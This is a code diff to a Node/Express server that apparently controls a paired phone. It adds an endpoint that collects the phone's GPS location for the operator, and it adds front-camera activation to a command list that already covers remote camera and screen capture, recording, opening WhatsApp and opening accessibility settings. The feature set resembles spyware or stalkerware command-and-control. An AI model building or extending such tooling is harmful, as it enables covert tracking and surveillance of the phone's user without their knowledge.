@@ -149,6 +149,18 @@ app.get("/api/status", requireAuth, (req, res) => res.json({
   mediaCount: state.media.length,
   serverTime: new Date().toISOString()
 }));
+app.get("/api/location", requireAuth, (_req, res) => res.json({ location: state.lastLocation || null }));
+app.post("/api/device/location", requireDevice, async (req, res) => {
+  const latitude = Number(req.body?.latitude), longitude = Number(req.body?.longitude);
+  const accuracy = Number(req.body?.accuracy), timestamp = Number(req.body?.timestamp);
+  if (!Number.isFinite(latitude) || latitude < -90 || latitude > 90 ||
+      !Number.isFinite(longitude) || longitude < -180 || longitude > 180 ||
+      !Number.isFinite(accuracy) || accuracy < 0 || !Number.isFinite(timestamp)) {
+    return res.status(400).json({ error: "بيانات الموقع غير صالحة" });
+  }
+  state.lastLocation = { latitude, longitude, accuracy: Math.min(accuracy, 100000), timestamp, receivedAt: new Date().toISOString() };
+  await saveState(); broadcast({ type: "location" }); res.json({ ok: true });
+});
 app.get("/api/media", requireAuth, (req, res) => res.json({ items: state.media.slice(0, 100) }));
 app.get("/api/logs", requireAuth, (req, res) => res.json({ items: state.logs.slice(0, 100) }));
 app.delete("/api/logs", requireAuth, async (req, res) => { state.logs = []; commands.length = 0; await saveState(); broadcast({ type: "logs" }); res.json({ ok: true }); });
@@ -196,7 +208,7 @@ app.post("/api/device/media", requireDevice, upload.single("file"), async (req, 
   await saveState(); broadcast({ type: "media", item }); res.json({ ok: true, item });
 });
 app.post("/api/control", requireAuth, (req, res) => {
-  const allowed = new Set(["camera_start", "camera_stop", "capture", "focus_center", "zoom", "record_start", "record_stop", "whatsapp_open", "screen_start", "screen_stop", "accessibility_settings"]);
+  const allowed = new Set(["camera_start", "camera_front_start", "camera_stop", "capture", "focus_center", "zoom", "record_start", "record_stop", "whatsapp_open", "screen_start", "screen_stop", "accessibility_settings"]);
   const command = String(req.body?.command || "");
   if (!allowed.has(command)) return res.status(400).json({ error: "أمر غير مدعوم" });
   if (!state.paired) return res.status(409).json({ error: "اربط الهاتف أولاً من التطبيق" });
